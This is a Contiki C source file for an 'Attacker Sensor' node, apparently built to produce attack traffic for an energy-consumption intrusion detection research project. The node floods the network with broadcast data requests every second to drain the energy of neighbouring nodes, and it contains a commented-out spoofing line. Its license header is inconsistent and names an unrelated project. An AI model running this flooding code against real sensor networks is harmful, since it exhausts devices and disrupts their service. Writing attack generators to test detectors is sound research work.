/*
 * Copyright (c) 2007, Swedish Institute of Computer Science.
/**
 * ---------------------------------------------------------------------
 *
 * LADE - Lightweight Architecture for Detection of EDAs
 *
 * https://github.com/ratado/lade
 * 
 * @author Andre Proto
 * @copyright 2024 Andre Proto and contributors.
 * @copyright 2007, Swedish Institute of Computer Science.
 * @licence   https://www.gnu.org/licenses/gpl-3.0.html
 *
 * ---------------------------------------------------------------------
 *
 * LICENSE
 *
 * This file is part of GLPI.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * ---------------------------------------------------------------------
 */

/**
 * \file
 *         IDS implementation based on energy consumption
 * \author
 *         Andre Proto <andre.proto@gmail.com>
 */

#include "contiki.h"
#include "net/rime/rime.h"
#include "random.h"
#include "dev/button-sensor.h"
#include "dev/leds.h"
#include <stdio.h>

static void unicast_recv(struct unicast_conn *c, const linkaddr_t *from);
static void broadcast_recv(struct broadcast_conn *c, const linkaddr_t *from);
/*---------------------------------------------------------------------------*/
static const struct broadcast_callbacks broadcast_call = {broadcast_recv};
static const struct unicast_callbacks unicast_callbacks = {unicast_recv};
static struct broadcast_conn broadcast;
static struct unicast_conn uc;
static unsigned short numNodes, contProcess, receivedMsg;
/*---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*/
PROCESS(attack_process, "Attacker Sensor");
AUTOSTART_PROCESSES(&attack_process);
/*---------------------------------------------------------------------------*/
static void
unicast_recv(struct unicast_conn *c, const linkaddr_t *from)
{
  //printf("unicast message received from %d.%d, data: %d\n",
	 //from->u8[0], from->u8[1], *(int *)packetbuf_dataptr());

	if(contProcess){
		numNodes++;	
	}
	else{
		receivedMsg++;
		if(receivedMsg == numNodes){
			process_post(&attack_process, PROCESS_EVENT_CONTINUE , NULL );
		}
	}

}
static void
broadcast_recv(struct broadcast_conn *c, const linkaddr_t *from)
{
  // do nothing
}

PROCESS_THREAD(attack_process, ev, data)
{
  static struct etimer et;
	static char requestData[20];
	static linkaddr_t fakeaddr;
  //powertrace_info info;

  PROCESS_EXITHANDLER(broadcast_close(&broadcast); unicast_close(&uc);)

  PROCESS_BEGIN();
	sprintf(requestData, "request data");
	
	broadcast_open(&broadcast, 129, &broadcast_call);
  unicast_open(&uc, 140, &unicast_callbacks);

	etimer_set(&et, CLOCK_SECOND *5); // Wait 5 seconds before start attack
	PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));

	// counting number of victims. The attacker will request data and wait the answer of all nodes to send another request.
	contProcess=1;
	packetbuf_copyfrom(requestData, strlen(requestData)+1);
	broadcast_send(&broadcast);
	etimer_set(&et, CLOCK_SECOND *2); // Wait 5 seconds for all answers
	PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
	contProcess=0;
	// Replying msg for other node
	fakeaddr.u8[0] = 1;
	fakeaddr.u8[1] = 0;
  while(1) {
    etimer_set(&et, CLOCK_SECOND *1);
    packetbuf_copyfrom(requestData, strlen(requestData)+1);
		//packetbuf_set_addr(PACKETBUF_ADDR_SENDER, &fakeaddr);
    broadcast_send(&broadcast);
		PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
		//PROCESS_WAIT_EVENT();		
		receivedMsg=0;
    //printf("broadcast request message sent\n");
    etimer_reset(&et);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
